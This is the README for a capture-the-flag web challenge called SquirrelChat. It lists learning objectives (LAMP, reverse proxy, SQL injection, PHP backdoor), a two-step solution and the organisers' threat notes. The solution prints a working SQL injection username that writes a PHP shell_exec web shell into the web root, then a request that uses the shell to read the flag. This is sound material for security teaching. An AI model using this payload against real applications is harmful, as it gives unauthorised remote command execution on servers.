# SquirrelChat

## Learning Objective

1. Basics of LAMP stack
2. Web Reverse Proxy
3. SQL injection
4. PHP backdoor

## Solution

1. Register a new account with username: `testuser1'); SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/asdfasdf.php'; -- `
2. Visit `/asdfasdf.php?c=cat+/flag` to obtain the flag

## Threats identified

- Get stage 2 sol from `/chat/user?id=` using `LIMIT ... OFFSET` (mitigated)
- Player accdentially leak the sol via the public chatroom (mitigated)
- Player remove files from `/var/www/html` (mitigated)
- Player nuke the database (autosolver healthcheck pending)
